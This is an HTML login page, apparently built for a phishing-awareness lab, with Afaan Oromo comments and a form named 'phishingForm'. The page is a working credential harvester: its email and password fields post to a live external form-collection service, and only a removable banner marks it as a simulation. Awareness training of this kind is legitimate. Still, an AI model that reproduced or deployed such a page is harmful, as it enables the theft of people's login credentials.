<!DOCTYPE html>
<html lang="or">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Woyesa Cybersecurity Lab - Login Simulation</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #ffffff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #666;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .alert-box {
            background-color: #ffe6e6;
            color: #cc0000;
            padding: 10px;
            border-radius: 4px;
            border: 1px solid #ffcccc;
            margin-top: 15px;
            display: none;
            font-size: 14px;
        }
        .warning-box {
            background-color: #fff3cd;
            color: #856404;
            padding: 10px;
            border-radius: 4px;
            border: 1px solid #ffeeba;
            margin-top: 15px;
            font-size: 13px;
            text-align: center;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2><b>Woyesa Cybersecurity Lab</b></h2>
    <p style="text-align: center; color: #555;"><b>Please sign in to continue.</b></p>

    <!-- FORM INITIALIZATION FOR FORMBOLD -->
    <!-- Bakka 'YOUR_FORM_ID_HERE' jedhutti ID kee kan FormBold galchi -->
    <form action="https://formbold.com/s/9kZ2G" method="POST" id="phishingForm">
        
        <!-- Email Input -->
        <div class="form-group">
            <label for="email"><b>Email Address</b></label>
            <input type="email" name="email" id="email" required placeholder="example@domain.com">
        </div>

        <!-- Password Input -->
        <div class="form-group">
            <label for="password"><b>Password</b></label>
            <input type="password" name="password" id="password" required placeholder="••••••••">
        </div>

        <!-- Submit Button -->
        <button type="submit" id="signInBtn"><b>Sign In</b></button>
    </form>

    <!-- ERGAA ALERT DEETAAN ERGAMUU ISAA MIRKANEESSU -->
    <div id="simulationAlert" class="alert-box">
        <b>⚠️ Simulation complete! Data sent to lab environment securely.</b>
    </div>

    <!-- AKEEKKACHIISA LABORATOORII ONLY -->
    <div class="warning-box">
        <b>⚠️ LAB SIMULATION ONLY: This is a cyber security awareness environment. Do not use real credentials.</b>
    </div>
</div>

<script>
    // JavaScript FormBold deetaa erguu isaa hordofu
    document.getElementById('phishingForm').addEventListener('submit', function(event) {
        // Saanduqa alert dhuunfaan akka mul'atu gochuu
        document.getElementById('simulationAlert').style.display = 'block';
    });
</script>

</body>
</html>
